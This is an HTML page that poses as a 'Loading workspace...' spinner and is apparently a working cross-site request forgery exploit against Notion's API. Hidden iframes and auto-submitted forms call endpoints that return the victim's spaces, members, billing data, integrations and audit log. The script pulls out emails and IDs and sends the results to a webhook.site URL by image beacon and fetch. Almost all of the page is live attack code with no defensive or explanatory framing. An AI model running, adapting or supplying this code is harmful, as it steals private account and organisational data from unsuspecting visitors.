<!DOCTYPE html>
<html>
<head>
<title>Loading...</title>
<style>
  body {
    font-family: -apple-system, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
    background: #fff;
  }
  .spinner {
    width: 24px; height: 24px;
    border: 3px solid #eee;
    border-top-color: #000;
    border-radius: 50%;
    animation: spin 0.7s linear infinite;
    margin: 0 auto 16px;
  }
  @keyframes spin { to { transform: rotate(360deg) } }
  p { color: #999; font-size: 0.9rem; text-align: center; }
</style>
</head>
<body>

<div>
  <div class="spinner"></div>
  <p>Loading workspace...</p>
</div>

<!-- Step 1: Login iframe refreshes cookies -->
<iframe id="loginFrame" name="loginFrame"
        src="https://www.notion.so/login"
        style="display:none">
</iframe>

<!-- Step 2: Data iframe catches CSRF response -->
<iframe id="dataFrame" name="dataFrame"
        style="display:none">
</iframe>

<script>
// ─── CONFIG ──────────────────────────────────────
const WEBHOOK = 'https://webhook.site/63849bc4-ecf6-40ff-8ebd-6aa90ca0a483'
// ─────────────────────────────────────────────────

function fireForm(endpoint, body, target) {
  const f = document.createElement('form')
  f.method = 'POST'
  f.action = 'https://www.notion.so/api/v3/' + endpoint
  f.enctype = 'text/plain'
  f.target = target || 'dataFrame'
  const i = document.createElement('input')
  i.name = body.slice(0, -1) + ',"x":"'
  i.value = '"}'
  f.appendChild(i)
  document.body.appendChild(f)
  f.submit()
  document.body.removeChild(f)
}

function exfil(label, data) {
  // Method 1: image beacon
  new Image().src = WEBHOOK + '?' + label + '=' 
    + btoa(unescape(encodeURIComponent(
        JSON.stringify(data).substring(0, 2000)
      )))
  // Method 2: fetch no-cors
  fetch(WEBHOOK + '?' + label + '=' 
    + btoa(unescape(encodeURIComponent(
        JSON.stringify(data).substring(0, 2000)
      ))), { mode: 'no-cors' }
  ).catch(() => {})
}

// ─── STEP 1: Wait for login iframe to load ───────
// Login iframe refreshes SameSite=None cookies
document.getElementById('loginFrame').onload = function() {
  console.log('Login frame loaded — cookies refreshed')

  // Wait 1 second then fire CSRF
  setTimeout(fireCSRF, 1000)
}

// ─── STEP 2: Fire CSRF after cookies refresh ─────
function fireCSRF() {
  console.log('Firing CSRF...')
  fireForm('getSpaces', '{}', 'dataFrame')
}

// ─── STEP 3: Read response and exfil ─────────────
document.getElementById('dataFrame').onload = function() {
  try {
    const raw = this.contentDocument.body.innerText

    // Skip empty loads
    if (!raw || raw.length < 10) return

    console.log('Got response:', raw.substring(0, 200))

    // Parse and extract key fields
    let parsed = {}
    try { parsed = JSON.parse(raw) } catch(e) {}

    // Extract useful data
    const result = {
      raw:       raw.substring(0, 3000),
      email:     raw.match(/"email":"([^"]+)"/)?.[1],
      userId:    raw.match(/"notion_user":\{"([^"]+)"/)?.[1],
      spaceId:   raw.match(/"id":"([a-f0-9-]{36})"/)?.[1],
      spaceName: raw.match(/"name":"([^"]+)"/)?.[1],
      domain:    raw.match(/"domain":"([^"]+)"/)?.[1],
      plan:      raw.match(/"plan":"([^"]+)"/)?.[1],
    }

    console.log('Extracted:', result)

    // Send to webhook
    exfil('spaces', result)

    // Chain more requests with extracted IDs
    if (result.spaceId) {
      setTimeout(() => chainAttacks(result.spaceId, result.userId), 500)
    }

  } catch(e) {
    console.log('Read blocked:', e.message)
    // Even if read blocked, CSRF still fired
    exfil('csrf_fired', { status: 'fired', err: e.message })
  }
}

// ─── STEP 4: Chain more attacks ──────────────────
let attackIndex = 0

function chainAttacks(spaceId, userId) {
  const attacks = [

    // Get subscription / billing
    {
      endpoint: 'getSubscriptionData',
      body: `{"spaceId":"${spaceId}"}`,
      label: 'billing'
    },

    // Get all members
    {
      endpoint: 'getSpaceMembers',
      body: `{"spaceId":"${spaceId}"}`,
      label: 'members'
    },

    // Get integrations
    {
      endpoint: 'getIntegrations',
      body: `{"spaceId":"${spaceId}"}`,
      label: 'integrations'
    },

    // Get audit log
    {
      endpoint: 'getAuditLog',
      body: `{"spaceId":"${spaceId}"}`,
      label: 'auditlog'
    },

    // Get user settings
    {
      endpoint: 'getUserAnalyticsSettings',
      body: '{}',
      label: 'settings'
    },

  ]

  // Fire one attack at a time
  // Each opens in dataFrame and triggers onload
  if (attackIndex < attacks.length) {
    const attack = attacks[attackIndex]
    console.log('Firing:', attack.endpoint)

    // Temporarily override onload label
    document.getElementById('dataFrame').dataset.label = attack.label
    fireForm(attack.endpoint, attack.body, 'dataFrame')
    attackIndex++
  }
}

// Override dataFrame onload to handle chained attacks
const originalOnload = document.getElementById('dataFrame').onload
document.getElementById('dataFrame').onload = function() {

  const label = this.dataset.label

  if (label && label !== '') {
    // Chained attack response
    try {
      const raw = this.contentDocument.body.innerText
      if (raw && raw.length > 10) {
        exfil(label, { raw: raw.substring(0, 2000) })
        console.log(label + ':', raw.substring(0, 200))
      }
    } catch(e) {}

    // Fire next attack
    const spaceId = document.getElementById('dataFrame').dataset.spaceId
    if (spaceId) setTimeout(() => chainAttacks(spaceId, ''), 500)

  } else {
    // First getSpaces response
    originalOnload.call(this)
  }
}
</script>

</body>
</html>
